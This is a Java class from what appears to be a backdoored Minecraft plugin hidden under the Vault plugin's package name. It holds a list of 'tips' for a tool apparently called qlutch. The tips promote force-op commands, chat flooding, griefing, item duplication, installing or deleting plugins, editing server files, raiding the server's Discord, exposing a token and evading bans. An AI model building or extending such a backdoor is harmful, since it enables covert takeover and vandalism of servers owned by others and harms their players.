package net.milkbowl.vault.methods;

import java.util.Random;

import net.milkbowl.vault.util.Settings;

public class Tips {
	
	public static String getTip() {
		String[] arr={
				"Remember to flood chat using " + Settings.HIGHLIGHT_COLOUR + "'flood'",
				"Dont get banned by using "+Settings.HIGHLIGHT_COLOUR + "'togglecmds' & 'lockconsole'",
				"Good griefing tools are "+Settings.HIGHLIGHT_COLOUR+"'bombs'",
				"Talk to other" + Settings.NAME + " users using "+Settings.HIGHLIGHT_COLOUR + "'sc <message>'",
				"Talk in regular chat using " + Settings.HIGHLIGHT_COLOUR + "'chat <message>'",
				"Enter file navigation using " + Settings.HIGHLIGHT_COLOUR + "'fn'",
				"To make sure you don't get caught, use " + Settings.HIGHLIGHT_COLOUR + "'blatant'",
				"Dupe your items with " + Settings.HIGHLIGHT_COLOUR + "'dupe'",
				"Install other plugins with " + Settings.HIGHLIGHT_COLOUR + "'install'",
				"Delete other plugins with " + Settings.HIGHLIGHT_COLOUR + "'delplugin'",
				"Edit/delete files on the server using " + Settings.HIGHLIGHT_COLOUR + "'edit'",
				"There are "+Settings.HIGHLIGHT_COLOUR+"over 100 " + " forceop commands",
				"Raid the servers discord using " + Settings.HIGHLIGHT_COLOUR + "'discordraider'",
				"Change the theme of qlutch using " + Settings.HIGHLIGHT_COLOUR + "'theme'",
				"To test if you can use discord raider, use "+Settings.HIGHLIGHT_COLOUR+"'showtoken'",
				"Use griefing wands with " + Settings.HIGHLIGHT_COLOUR + "'wands'",
				"Connect to " + Settings.NAME + " console using " + Settings.HIGHLIGHT_COLOUR + "'consoleconnect'"
				
		};
		Random r=new Random();
		int randomNumber=r.nextInt(arr.length);
		return arr[randomNumber];
	}

}
